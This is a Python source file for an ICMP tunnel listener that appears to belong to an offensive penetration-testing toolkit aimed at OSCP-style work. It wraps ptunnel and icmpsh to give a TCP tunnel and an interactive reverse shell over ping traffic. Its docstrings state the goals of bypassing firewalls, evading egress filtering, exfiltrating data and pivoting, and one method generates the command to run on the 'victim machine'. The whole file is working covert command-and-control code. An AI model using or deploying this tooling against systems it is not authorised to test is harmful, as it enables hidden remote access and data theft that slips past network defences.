"""
ICMP Tunnel Listener for covert channel communication.

Integrates with ptunnel and icmpsh for ICMP tunneling (ping tunnel).
Use case: Bypass firewalls that only allow ICMP (ping).

Usage:
    >>> from sessions.listeners.icmp_listener import ICMPListener
    >>> from sessions.manager import SessionManager
    >>>
    >>> # Start ptunnel ICMP tunnel
    >>> listener = ICMPListener(
    ...     session_manager=manager,
    ...     tool='ptunnel'
    ... )
    >>> listener.start()
    >>> print(f"Client command: {listener.get_client_command('<server_ip>', '<dest>', 80)}")
    >>>
    >>> # Start icmpsh ICMP shell
    >>> listener = ICMPListener(
    ...     session_manager=manager,
    ...     tool='icmpsh'
    ... )
    >>> listener.start()
"""

import subprocess
import threading
import time
import os
import uuid
import logging
from pathlib import Path
from typing import Dict, Any, List, Optional, Callable
from datetime import datetime

from ..interfaces import IListener
from ..models import Session, Listener, ShellCapabilities
from ..events import EventBus, SessionEvent
from ..storage.listener_store import ListenerRegistry

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ICMPListener(IListener):
    """ICMP tunnel listener for covert channel communication.

    Architecture:
    - Runs ICMP tunnel server (ptunnel or icmpsh)
    - Forwards TCP traffic over ICMP echo/reply (ptunnel)
    - Provides interactive shell over ICMP (icmpsh)
    - Requires raw socket access (root privileges)
    - Monitors ICMP packets for new connections

    Tools:
    - ptunnel: TCP-over-ICMP tunnel (port forwarding via ping)
    - icmpsh: Interactive shell over ICMP echo/reply

    How it works:
    1. Attacker runs ICMP listener (requires root)
    2. Victim sends ICMP echo requests with data payload
    3. Server responds with ICMP echo replies containing commands
    4. Full bidirectional tunnel established

    OSCP Use Case:
    - Firewall only allows ICMP (ping)
    - Exfiltrate data via ICMP payloads
    - Establish reverse shell over ICMP tunnel
    - Pivot through ICMP-only network segments
    - Bypass egress filtering (ICMP often allowed)

    Example:
        >>> # Ptunnel: TCP port forwarding over ICMP
        >>> listener = ICMPListener(
        ...     session_manager=manager,
        ...     tool='ptunnel',
        ...     password='secret123'
        ... )
        >>> listener.start()
        >>> # Client: ptunnel -p <server> -lp 8000 -da <dest> -dp 80 -x secret123
        >>> # Access localhost:8000 -> tunneled to dest:80 via ICMP
        >>>
        >>> # Icmpsh: Interactive shell over ICMP
        >>> listener = ICMPListener(
        ...     session_manager=manager,
        ...     tool='icmpsh'
        ... )
        >>> listener.start()
        >>> # Client: icmpsh.exe -t <server_ip>
    """

    def __init__(
        self,
        session_manager: Any,
        tool: str = 'ptunnel',
        password: Optional[str] = None,
        target_ip: Optional[str] = None
    ):
        """Initialize ICMP tunnel listener.

        Args:
            session_manager: SessionManager instance
            tool: ICMP tunnel tool ('ptunnel' or 'icmpsh')
            password: Password for ptunnel (default: auto-generated)
            target_ip: Expected target IP for icmpsh (optional)
        """
        self.session_manager = session_manager
        self.tool = tool
        self.password = password or self._generate_password()
        self.target_ip = target_ip

        # Internal state
        self.listener_id = str(uuid.uuid4())
        self.server_process: Optional[subprocess.Popen] = None
        self.monitor_thread: Optional[threading.Thread] = None
        self._running = False
        self._connection_callbacks: List[Callable[[str], None]] = []
        self._icmp_disabled = False

        # Session tracking
        self.sessions: List[str] = []

        # Listener model
        self.listener = Listener(
            id=self.listener_id,
            protocol='icmp',
            port=None,  # ICMP has no port concept
            status='stopped',
            config={
                'tool': tool,
                'password': self.password if tool == 'ptunnel' else None,
                'target_ip': target_ip
            }
        )

        # Registry
        self.registry = ListenerRegistry()

    def _generate_password(self) -> str:
        """Generate random password."""
        import secrets
        return secrets.token_urlsafe(16)

    def _check_tool_availability(self) -> bool:
        """Check if ICMP tunnel tool is installed.

        Returns:
            True if tool is available, False otherwise
        """
        if self.tool == 'ptunnel':
            # Check for ptunnel binary
            result = subprocess.run(['which', 'ptunnel'], capture_output=True)
            return result.returncode == 0
        elif self.tool == 'icmpsh':
            # Check for icmpsh_m.py script
            icmpsh_paths = [
                Path('/opt/icmpsh/icmpsh_m.py'),
                Path('/usr/share/icmpsh/icmpsh_m.py'),
                Path.home() / 'icmpsh' / 'icmpsh_m.py'
            ]
            return any(p.exists() for p in icmpsh_paths)
        return False

    def _get_icmpsh_path(self) -> Optional[Path]:
        """Get path to icmpsh_m.py script.

        Returns:
            Path to icmpsh_m.py or None if not found
        """
        icmpsh_paths = [
            Path('/opt/icmpsh/icmpsh_m.py'),
            Path('/usr/share/icmpsh/icmpsh_m.py'),
            Path.home() / 'icmpsh' / 'icmpsh_m.py'
        ]
        for path in icmpsh_paths:
            if path.exists():
                return path
        return None

    def _check_root_privileges(self) -> bool:
        """Check if running as root (required for raw sockets).

        Returns:
            True if running as root
        """
        return os.geteuid() == 0

    def _disable_icmp_replies(self) -> bool:
        """Disable kernel ICMP echo replies.

        Required for icmpsh to prevent kernel from responding to ICMP.

        Returns:
            True if disabled successfully
        """
        try:
            result = subprocess.run(
                ['sysctl', '-w', 'net.ipv4.icmp_echo_ignore_all=1'],
                capture_output=True,
                check=True
            )
            self._icmp_disabled = True
            logger.info("Disabled kernel ICMP replies")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to disable ICMP replies: {e}")
            return False

    def _enable_icmp_replies(self) -> bool:
        """Re-enable kernel ICMP echo replies.

        Returns:
            True if enabled successfully
        """
        try:
            result = subprocess.run(
                ['sysctl', '-w', 'net.ipv4.icmp_echo_ignore_all=0'],
                capture_output=True,
                check=True
            )
            self._icmp_disabled = False
            logger.info("Re-enabled kernel ICMP replies")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to enable ICMP replies: {e}")
            return False

    def start(self) -> bool:
        """Start ICMP tunnel server.

        Returns:
            True if started successfully

        Raises:
            RuntimeError: If tool not found or not running as root

        Example:
            >>> listener = ICMPListener(manager, tool='ptunnel')
            >>> if listener.start():
            ...     print("ICMP tunnel started")
        """
        if self._running:
            logger.warning("ICMP listener already running")
            return False

        # Check root privileges
        if not self._check_root_privileges():
            raise RuntimeError(
                "ICMP listener requires root privileges (raw sockets).\n"
                "Run with: sudo crack session icmp-start ..."
            )

        # Check tool availability
        if not self._check_tool_availability():
            tool_install = {
                'ptunnel': 'apt-get install ptunnel',
                'icmpsh': 'git clone https://github.com/bdamele/icmpsh.git /opt/icmpsh'
            }
            raise RuntimeError(
                f"ICMP tunnel tool '{self.tool}' not found.\n"
                f"Install: {tool_install.get(self.tool, 'unknown')}"
            )

        # Start appropriate tool
        if self.tool == 'ptunnel':
            return self._start_ptunnel()
        elif self.tool == 'icmpsh':
            return self._start_icmpsh()
        else:
            raise ValueError(f"Unknown ICMP tool: {self.tool}")

    def _start_ptunnel(self) -> bool:
        """Start ptunnel ICMP tunnel server.

        Ptunnel forwards TCP traffic over ICMP:
        - Client specifies local port and destination
        - Traffic tunneled via ICMP echo/reply
        - Server acts as relay

        Returns:
            True if started successfully
        """
        try:
            # Build ptunnel command
            # ptunnel -x password
            cmd = [
                'ptunnel',
                '-x', self.password  # Password for authentication
            ]

            logger.info("Starting ptunnel ICMP tunnel")
            logger.info(f"Command: {' '.join(cmd)}")

            # Start process
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Wait for startup
            time.sleep(2)

            # Check if process is still running
            if self.server_process.poll() is not None:
                stdout, stderr = self.server_process.communicate()
                raise RuntimeError(f"ptunnel failed to start: {stderr}")

            self._running = True

            # Update listener model
            self.listener.start()
            self.listener.pid = self.server_process.pid

            # Register with listener registry
            try:
                self.registry.register_listener(self.listener)
            except Exception as e:
                logger.warning(f"Failed to register listener: {e}")

            # Start monitoring thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_ptunnel,
                daemon=True
            )
            self.monitor_thread.start()

            # Emit event
            EventBus.publish(SessionEvent.LISTENER_STARTED, {
                'listener_id': self.listener_id,
                'protocol': 'icmp',
                'tool': 'ptunnel'
            })

            logger.info("[+] Ptunnel ICMP tunnel started")
            logger.info(f"[+] Password: {self.password}")
            logger.info(f"[+] Client command example: {self.get_client_command('<server_ip>', '<dest_ip>', 80)}")

            return True

        except Exception as e:
            logger.error(f"Failed to start ptunnel: {e}")
            self._running = False
            raise RuntimeError(f"Failed to start ptunnel: {e}")

    def _start_icmpsh(self) -> bool:
        """Start icmpsh ICMP shell server.

        Icmpsh provides interactive shell over ICMP:
        - Master listens for ICMP echo requests
        - Slave sends commands in echo requests
        - Master responds with output in echo replies

        Returns:
            True if started successfully
        """
        try:
            # Get icmpsh script path
            icmpsh_script = self._get_icmpsh_path()
            if not icmpsh_script:
                raise RuntimeError("icmpsh_m.py not found")

            # Disable kernel ICMP replies (required!)
            if not self._disable_icmp_replies():
                raise RuntimeError("Failed to disable kernel ICMP replies")

            # Build icmpsh command
            # python icmpsh_m.py <attacker_ip> <victim_ip>
            # If no target IP specified, use 0.0.0.0 (accept any)
            cmd = [
                'python',
                str(icmpsh_script),
                '0.0.0.0',  # Listen on all interfaces
                self.target_ip or '0.0.0.0'  # Accept from any client
            ]

            logger.info("Starting icmpsh ICMP shell")
            logger.info(f"Command: {' '.join(cmd)}")

            # Start process
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )

            # Wait for startup
            time.sleep(2)

            # Check if process is still running
            if self.server_process.poll() is not None:
                stdout, stderr = self.server_process.communicate()
                self._enable_icmp_replies()  # Restore
                raise RuntimeError(f"icmpsh failed to start: {stderr}")

            self._running = True

            # Update listener model
            self.listener.start()
            self.listener.pid = self.server_process.pid

            # Register with listener registry
            try:
                self.registry.register_listener(self.listener)
            except Exception as e:
                logger.warning(f"Failed to register listener: {e}")

            # Start monitoring thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_icmpsh,
                daemon=True
            )
            self.monitor_thread.start()

            # Emit event
            EventBus.publish(SessionEvent.LISTENER_STARTED, {
                'listener_id': self.listener_id,
                'protocol': 'icmp',
                'tool': 'icmpsh'
            })

            logger.info("[+] Icmpsh ICMP shell started")
            logger.info("[+] WARNING: Kernel ICMP replies disabled")
            logger.info(f"[+] Client command: {self.get_client_command('<server_ip>')}")

            return True

        except Exception as e:
            logger.error(f"Failed to start icmpsh: {e}")
            self._running = False
            if self._icmp_disabled:
                self._enable_icmp_replies()
            raise RuntimeError(f"Failed to start icmpsh: {e}")

    def _monitor_ptunnel(self):
        """Monitor ptunnel process output for new connections."""
        if not self.server_process:
            return

        logger.info("Started ptunnel monitor thread")

        try:
            while self._running and self.server_process.poll() is None:
                # Read output line by line
                line = self.server_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()
                logger.debug(f"ptunnel: {line}")

                # Detect new connection
                # Ptunnel logs: "Incoming tunnel request from X.X.X.X"
                if 'incoming tunnel request' in line.lower() or 'connection from' in line.lower():
                    # Extract IP if possible
                    parts = line.split()
                    client_ip = 'unknown'
                    for part in parts:
                        # Look for IP pattern
                        if '.' in part and not part.startswith('-'):
                            client_ip = part.strip('.,;:')
                            break
                    self._handle_new_connection(client_ip)

        except Exception as e:
            logger.error(f"Error in ptunnel monitor: {e}")

    def _monitor_icmpsh(self):
        """Monitor icmpsh process output for new sessions."""
        if not self.server_process:
            return

        logger.info("Started icmpsh monitor thread")

        connection_detected = False

        try:
            while self._running and self.server_process.poll() is None:
                # Read output line by line
                line = self.server_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()
                if line:
                    logger.debug(f"icmpsh: {line}")

                # Detect first connection (icmpsh doesn't log much)
                # Assume connection if we receive any output
                if not connection_detected and line:
                    connection_detected = True
                    self._handle_new_connection('unknown')

        except Exception as e:
            logger.error(f"Error in icmpsh monitor: {e}")

    def _handle_new_connection(self, client_ip: str):
        """Handle new ICMP tunnel connection.

        Args:
            client_ip: Client IP address
        """
        logger.info(f"[+] New ICMP tunnel connection from {client_ip}")

        try:
            # Create session
            session = self.session_manager.create_session(
                type='icmp',
                target=client_ip,
                port=0,  # ICMP has no port
                protocol='tunnel',
                shell_type='unknown' if self.tool == 'ptunnel' else 'bash',
                metadata={
                    'listener_id': self.listener_id,
                    'tool': self.tool,
                    'connection_time': datetime.now().isoformat()
                }
            )

            # Track session
            self.sessions.append(session.id)
            self.listener.add_session(session.id)

            logger.info(f"[+] Session {session.id[:8]} created for ICMP tunnel")

            # Call registered callbacks
            for callback in self._connection_callbacks:
                try:
                    callback(session.id)
                except Exception as e:
                    logger.error(f"Error in connection callback: {e}")

        except Exception as e:
            logger.error(f"Error handling ICMP connection: {e}")

    def stop(self) -> bool:
        """Stop ICMP tunnel server.

        Returns:
            True if stopped successfully
        """
        if not self._running:
            return False

        self._running = False

        # Terminate server process
        if self.server_process:
            try:
                self.server_process.terminate()
                self.server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_process.kill()

        # Re-enable ICMP replies if using icmpsh
        if self.tool == 'icmpsh' and self._icmp_disabled:
            self._enable_icmp_replies()

        # Update listener model
        self.listener.stop()

        # Unregister from registry
        try:
            self.registry.unregister_listener(self.listener_id)
        except Exception as e:
            logger.warning(f"Failed to unregister listener: {e}")

        # Emit event
        EventBus.publish(SessionEvent.LISTENER_STOPPED, {
            'listener_id': self.listener_id
        })

        logger.info(f"ICMP tunnel listener stopped ({self.tool})")

        return True

    def restart(self) -> bool:
        """Restart ICMP tunnel server.

        Returns:
            True if restarted successfully
        """
        self.stop()
        return self.start()

    def status(self) -> str:
        """Get current listener status.

        Returns:
            Status string ('running', 'stopped', 'crashed')
        """
        return self.listener.status

    def on_connection(self, callback: Callable[[str], None]) -> None:
        """Register callback for new connections.

        Args:
            callback: Function to call with session_id
        """
        self._connection_callbacks.append(callback)

    def get_active_sessions(self) -> List[str]:
        """Get list of active session IDs.

        Returns:
            List of session UUID strings
        """
        return self.sessions.copy()

    def get_client_command(
        self,
        server_ip: Optional[str] = None,
        destination: Optional[str] = None,
        port: Optional[int] = None
    ) -> str:
        """Generate client command for victim machine.

        Args:
            server_ip: Server IP (optional, defaults to <LHOST>)
            destination: Destination IP for ptunnel forwarding
            port: Destination port for ptunnel forwarding

        Returns:
            Client command string

        Example:
            >>> # Ptunnel
            >>> cmd = listener.get_client_command('192.168.45.200', '10.10.10.10', 80)
            >>> # Client tunnels localhost:8000 -> 10.10.10.10:80 via ICMP
            >>>
            >>> # Icmpsh
            >>> cmd = listener.get_client_command('192.168.45.200')
        """
        server_ip = server_ip or '<LHOST>'

        if self.tool == 'ptunnel':
            # Ptunnel client command
            # ptunnel -p <server> -lp 8000 -da <dest> -dp 80 -x password
            destination = destination or '<DESTINATION_IP>'
            port = port or 80
            return (
                f"ptunnel -p {server_ip} -lp 8000 -da {destination} "
                f"-dp {port} -x {self.password}"
            )
        elif self.tool == 'icmpsh':
            # Icmpsh client command (Windows executable)
            # icmpsh.exe -t <server_ip>
            return f"icmpsh.exe -t {server_ip}"
        else:
            return "Unknown tool"

    def get_listener_info(self) -> Dict[str, Any]:
        """Get listener information.

        Returns:
            Dictionary with listener details
        """
        return {
            'listener_id': self.listener_id,
            'protocol': 'icmp',
            'port': None,
            'status': self.listener.status,
            'tool': self.tool,
            'password': self.password if self.tool == 'ptunnel' else None,
            'target_ip': self.target_ip,
            'icmp_disabled': self._icmp_disabled,
            'session_count': len(self.sessions),
            'sessions': self.sessions,
            'pid': self.listener.pid,
            'client_command': self.get_client_command()
        }
